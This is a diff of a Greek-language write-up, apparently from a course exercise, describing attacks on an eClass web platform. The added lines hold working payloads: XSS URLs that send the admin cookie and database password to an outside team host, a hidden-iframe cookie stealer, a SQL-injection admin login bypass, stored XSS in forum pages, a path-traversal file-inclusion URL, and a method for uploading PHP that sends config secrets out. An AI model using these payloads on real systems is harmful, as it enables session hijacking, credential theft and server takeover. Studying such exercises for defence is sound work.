@@ -120,13 +120,13 @@
   Έτσι, καθ'αυτόν τον τρόπο φτιάξαμε το παρακάτω paylaod το οποίο έκανε όλη τη δουλειά κωδικοποιημένα:
   
   - __Χωρίς Κωδικοποίηση__
-  > http://192.168.1.12/modules/admin/eclassconf.php/"><script>document.ready(document.body.insertAdjacentHTML('afterend', <img src="image_url" alt="" onload="window.location.href='http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallenAgain_Password='.concat(document.getElementsByName('formmysqlPassword')[0].getAttribute('value'))"/>))</script>
+  > http://hackerz.csec.chatzi.org/modules/admin/eclassconf.php/"><script>document.ready(document.body.insertAdjacentHTML('afterend', <img src="image_url" alt="" onload="window.location.href='http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallenAgain_Password='.concat(document.getElementsByName('formmysqlPassword')[0].getAttribute('value'))"/>))</script>
   
   - __1ο Στάδιο Κωδικοποίησης (_Ιδιαίτερα μεγάλο URL και παρατίθεται ένας μέρος του_)__
-  > http://192.168.1.12/modules/admin/eclassconf.php/"><script>document.ready(document.body.insertAdjacentHTML('afterend', ''.concat(String.fromCharCode(60)).concat('img').concat(String.fromCharCode(32)).concat('src').concat(String.fromCharCode(61))  ...  ))</script>
+  > http://hackerz.csec.chatzi.org/modules/admin/eclassconf.php/"><script>document.ready(document.body.insertAdjacentHTML('afterend', ''.concat(String.fromCharCode(60)).concat('img').concat(String.fromCharCode(32)).concat('src').concat(String.fromCharCode(61))  ...  ))</script>
   
   - __2ο Στάδιο Κωδικοποίησης (_Εξαιρετικά μεγάλο URL, φτάνει το όριο επιτρεπτού URL length και παρατίθεται ένας μέρος του_)__
-    > http://192.168.1.12/modules/admin/eclassconf.php/%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%72%65%61%64%79%28%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%73%65%72%74%41%64%6a%61%63%65%6e%74%48%54%4d%4c%28%27  ...  /  ...  
+    > http://hackerz.csec.chatzi.org/modules/admin/eclassconf.php/%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%72%65%61%64%79%28%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%73%65%72%74%41%64%6a%61%63%65%6e%74%48%54%4d%4c%28%27  ...  /  ...  
   
 ---
 ## Κενά Ασφαλείας και Επιθέσεις
@@ -215,6 +215,14 @@
 
        ##### ___Τα δεδομένα εμφανίζονται στη θέση εμφάνισης του κωδικού του μαθήματος (πχ ΤΜΑ100)___
 	 
+	  
+       - Στη σελίδα ___unpgrade.php___, ___upgrade/index.php___ (_δε λειτούργησε στον target μας, δουλεύει σε unpatched_) \
+       	 μπορούμε με ένα πολύ απλό SQL injection να συνδεθούμε με πλήρη admin access σε όλες τις σελίδες!\
+	 Η σελίδα έχει ένα login page που αν βάλουμε στο username: \
+	 -> drunkadmin' -- - \
+	 θα παρακάμψει τον έλεγχο του κωδικού και θα πάρουμε πλήρη δικαιώματα διαχειριστή.
+	 
+	 
 	 
 	 
 
@@ -296,7 +304,12 @@
        
        7. ___refresh_chat.orig.php___   (___Stored XSS___)   \[_δε λειτούργησε στον target μας, δουλεύει σε unpatched_]
        > Με αυτό το αρχείο μπορούμε να φορτώσουμε όλα τα καταχωρημένα μηνύματα και κατ'επέκταση να εκτελεστεί το script μας.
-
+       
+       8. ___newtopic.php___, ___reply.php___   (___Stored XSS___)   \[_δε λειτούργησε στον target μας, δουλεύει σε unpatched_]
+       > Μπορούμε σε αυτά τα αρχεία να ενσωματώσουμε scripts στο όνομα του νέου θέματος που θέλουμε να φτιάξουμε και στο εργαλείο \
+       > που δίνει για συγγραφή του νέου μηνύματος, έχει ένα tool που τροποποιεί και ενσωματώνει HTML κώδικα. Έτσι πολύ εύκολα, \
+       > μπορεί να ενσωματωθεί οποιοδήποτε script και οποιοσδήποτε κώδικας HTML.
+       
 
 	Ένα πολύ σημαντικό XSS attack βρίσκεται στο ___conference.orig.php___ με αλλαγή της μεταβλητής \
 	__MCU__ (_no it's not Marvel's Cinematic Universe but it's still epic!_:p)
@@ -313,16 +326,60 @@
 	iframes και να τρέξω εσωτερικά σε αυτά πολλαπλές σελίδες οι οποίες θα μπορούσαν να στείλουν πολλαπλά δεδομένα στους server μας.
 	
        ##### Cookie Stealer
-	> http://192.168.1.12/modules/conference/conference.orig.php?MCU=<script>window.location.href = "http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallenAgain=".concat(document.cookie);</script>
+	> http://hackerz.csec.chatzi.org/modules/conference/conference.orig.php?MCU=<script>window.location.href = "http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallenAgain=".concat(document.cookie);</script>
 	
+	 
+	 
 	 
 	 
   - __CSRF__
        
-       Με αυτό το είδος της επίθεσης καταφέραμε να πάρουμε το cookie του drunkadmin, όπως αναφέρθηκε στο ___Defacement Section___. \
-       Ουσιαστικά σε κάθε σελίδα __.php__ που τυπώνει κάτι ή/και έχει μέσα κάποια φόρμα με \_GET ή \_POST method, μπορέι να \
-       γίνει XSS attack. Επιπλέον, σε κάθε σελίδα που μπορούμε σύμφωνα με τα προηγούμενο attack να προκαλέσουμε κάποιο SQL error, \
-       τότε μπορούμε να κάνουμε κάποιο __XSS attack__ κάνοντάς το να τυπωθεί μέσα στο SQL error.
+       Αυτό το attack σε συνδυασμό με τα παραπάνω Reflected XSS χρησιμοποιήθηκαν για την υποκλοπή του cookie του drunkadmin. \
+       Φτιάξαμε ένα site στο puppies το οποίο ενσωμάτωνε ένα κρυφό iframe το οποίο έκανε ανακατεύθυνση σε μια σελίδα που ήταν \
+       ευάλωτη σε XSS attacks.
+       
+       `<iframe width="0" height="0" style="visibility: hidden;" src='http://hackerz.csec.chatzi.org/modules/agenda/myagenda.php?month=6&year=2020<script>window.location.href = "http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallen=".concat(document.cookie);</script>'></iframe>`
+       
+	
+	 
+	 
+	 
+	 
+  - __RFI/LFI__
+       
+       Ήταν ανοιχτή η δυνατότητα υποβολής .php αρχείου. Έτσι απευθείας, εκμεταλλευόμενοι όλα τα παραπάνω attacks μπορούσαμε \
+       να πάρουμε τον έλεγχο της βάσης και να βρούμε το που είναι αποθηκευμένα τα αρχεία που ανεβάσαμε και με τι όνομα. \
+       Αυτό παρακάμπτει ακόμα και τα κρυφά hashes των φακέλων και των αρχείων και το μόνο που έμενε ήταν να βρούμε έναν τρόπο \
+       να εκτελέσουμε αυτά τα php files. 
+       
+       Αυτό θα μπορούσε να γίνει αν υπήρχε listing στους καταλόγους πολύ εύκολα. Αλλά εν προκειμένω που δεν υπήρχε αυτή η \
+       δυνατότητα, χρησιμοποιήσαμε SQL Injection για να βρούμε τα ονόματα των φακέλων και των αρχείων.
+       
+       Ωστόσο, το πρώτο που κάναμε ήταν να ανεβάσουμε ένα αρχείο το οποιο έκανε include το config.php και έκανε ένα request \
+       στο server μας στέλνοντας τον κωδικό της βάσης σε εμάς.
+       
+       Τώρα ο τρόπος με τον οποίο εκτελέστηκαν τα php files, είναι από ένα και μοναδικό αρχείο του admin στο οποίο έχουν \
+       πρόσβαση όλοι και δε λαμβα΄νεται κανένας έλεγχος για τη μεταβλητή που δίνεται ως παράμετρος. Έχει αναλυθεί και στο \
+       ___Defacement Section___. Από αυτήν τη σελίδα μπορεί να εκτελεστεί κάθε php που υπάρχει στο server.
+       
+       > http://hackerz.csec.chatzi.org/modules/admin/sysinfo/index.php?lng=../../../../../<path to php\>
+       
+       Με αυτό το URL, μπορούμε να ανακατευθύνουμε την εκτέλεση σε κάθε πιθανό php που υπάρχει στον server!
+       
+       
+       Αξίζει να σημειωθεί ότι ακόμα και αν δεν υπήρχε η δυνατότητα να κάνουμε κάπου SQL injection για να πάρουμε τα κρυφά \
+       ονόματα των φακέλων και των αρχείων που ανεβάσαμε, υπάρχει μια ακόμα πολύ καλή δυνατότητα από την οποία μπορούμε \
+       να παρακάμψουμε όλα τα hashes και να δημιουργήσουμε έναν φάκελο με δικό μας όνομα και να το προσπελάσουμε μέσω του \
+       sysinfo/index.php πολύ εύκολα και άμεσα.
+       
+       Αυτό το σημείο βρίσκεται στο ανέβασμα κάποιας εργασίας στο ___work.php___.
+       
+       Μπορείς αν δεν το έχουν προβλέψει οι αντίπαλοι, αλλάζοντας το id πάνω στο URL να "σπάσεις" τη διαδικασία ανεβάσματος. \
+       Αν βάλουμε για παράδειγμα για id ένα μεγαλύτερο από το μέγιστο που υπάρχει, θα φτιαχτεί ένας φάκελος με όνομα τον επόμενο \
+       αύξοντα αριθμό του τλεευταίου id. Για παράδειγμα θα φτιαχτεί ένας φάκελος με όνομα 2 ή 3. Έτσι εφόσον το όνομα των αρχειων \
+       που μπαίνουν μέσα παίρνουν σαν όνομα το Ονοματεπώνυμο και το ΑΜ του χρήστη που την ανέβασε. Άρα ξέρουμε πλέον όλα τα στοιχεία \
+       του php που ανεβάσαμε και μπορούμε να το τρέξουμε χωρίς κανένα άλλο attack.
+       
        
        
 ---
